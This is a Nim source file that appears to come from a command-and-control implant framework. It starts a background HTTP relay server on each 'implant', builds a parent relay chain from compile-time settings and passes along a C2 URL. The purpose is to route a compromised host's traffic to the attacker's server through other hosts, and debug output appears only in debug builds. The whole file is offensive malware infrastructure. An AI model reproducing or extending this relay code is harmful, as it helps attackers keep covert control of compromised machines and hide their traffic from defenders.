#[
    HTTP Relay Server Launcher
    Starts the HTTP relay server if RELAY_PORT is defined at compile time
]#

import asyncdispatch, threadpool
import http_relay

# Check if RELAY_PORT is defined at compile time
const RELAY_PORT {.intdefine.}: int = 0

# Global flag to prevent duplicate starts
var g_relayServerStarted: bool = false
var g_relayServerPort: int = 0

# Background proc to run relay server (non-blocking)
proc runRelayServerInBackground(port: int, implantGuid: string, parentAddr: string, c2Url: string) =
    when defined debug:
        echo "[RELAY] 🔧 Background thread starting relay server on port " & $port
        if parentAddr != "":
            echo "[RELAY] 🔧 Parent: " & parentAddr
        if c2Url != "":
            echo "[RELAY] 🔧 C2 URL: " & c2Url
    try:
        # startRelayServer is async, need to wait for it
        waitFor http_relay.startRelayServer(port, implantGuid, parentAddr, c2Url)
    except Exception as e:
        when defined debug:
            echo "[RELAY] ❌ Background relay server crashed: " & e.msg

# Start HTTP relay server with dynamic port (runtime command)
# Returns immediately after spawning background server
proc startRelayServerWithPort*(port: int, implantGuid: string, parentAddr: string = "", c2Url: string = ""): bool =
    # Idempotent guard: return early if already started
    if g_relayServerStarted:
        when defined debug:
            echo "[RELAY] ℹ️  Relay server already started on port " & $g_relayServerPort & ", skipping duplicate start"
        return false
    
    when defined debug:
        echo "[RELAY] 🚀 Starting HTTP Relay server on port " & $port
        echo "[RELAY] 🆔 Using implant GUID: " & implantGuid
        if parentAddr != "":
            echo "[RELAY] 🔗 Parent relay: " & parentAddr
        if c2Url != "":
            echo "[RELAY] 🎯 C2 URL: " & c2Url
    
    # Start relay server in background thread (non-blocking)
    try:
        # Spawn background thread
        when compileOption("threads"):
            spawn runRelayServerInBackground(port, implantGuid, parentAddr, c2Url)
        else:
            # Fallback: start in current thread (will block, but at least works)
            runRelayServerInBackground(port, implantGuid, parentAddr, c2Url)
        
        g_relayServerStarted = true  # Mark as started
        g_relayServerPort = port
        
        when defined debug:
            echo "[RELAY] ✅ HTTP Relay server spawned on port " & $port
        
        return true
                
    except Exception as e:
        when defined debug:
            echo "[RELAY] ❌ Exception starting relay server: " & e.msg
            echo "[RELAY] ❌ Stack trace: " & e.getStackTrace()
        return false

# Start HTTP relay server in async mode (compile-time RELAY_PORT)
proc startRelayServerAsync*(implantGuid: string) {.async.} =
    when RELAY_PORT > 0:
        # Extract parent chain from RELAY_CHAIN (everything after the first hop, which is us)
        const RELAY_CHAIN {.strdefine.}: string = ""
        var parentChain: string = ""
        
        when RELAY_CHAIN != "":
            # Clean and validate hops
            var cleanHops: seq[string] = @[]
            for hop in RELAY_CHAIN.split(","):
                let trimmedHop = hop.strip()
                if trimmedHop.len > 0:
                    cleanHops.add(trimmedHop)
            
            # Parent chain is everything AFTER the first hop (which should be us)
            if cleanHops.len > 1:
                # Skip the first hop (ourselves) and join the rest
                var restOfChain: seq[string] = @[]
                for i in 1..<cleanHops.len:
                    restOfChain.add(cleanHops[i])
                parentChain = restOfChain.join(",")
                
                when defined debug:
                    echo "[RELAY] 🔗 Compile-time RELAY_CHAIN: " & RELAY_CHAIN
                    echo "[RELAY] 🔗 Parent chain (after us): " & parentChain
            else:
                when defined debug:
                    echo "[RELAY] ⚠️  RELAY_CHAIN only has one hop (us), no parent chain"
        
        when defined debug:
            echo "[RELAY] 🚀 Starting compile-time relay server on port " & $RELAY_PORT
            echo "[RELAY] 🆔 Using implant GUID: " & implantGuid
        
        # Start relay server with parent chain, no C2 URL needed for relay client
        discard startRelayServerWithPort(RELAY_PORT, implantGuid, parentChain, "")
    else:
        when defined debug:
            echo "[RELAY] ℹ️  No relay server configured (RELAY_PORT not defined)"

# Check if this implant should act as relay server
proc isRelayServer*(): bool =
    when RELAY_PORT > 0:
        return true
    else:
        return false

# Get the relay server port (0 if not configured)
proc getRelayServerPort*(): int =
    when RELAY_PORT > 0:
        return RELAY_PORT
    else:
        return 0
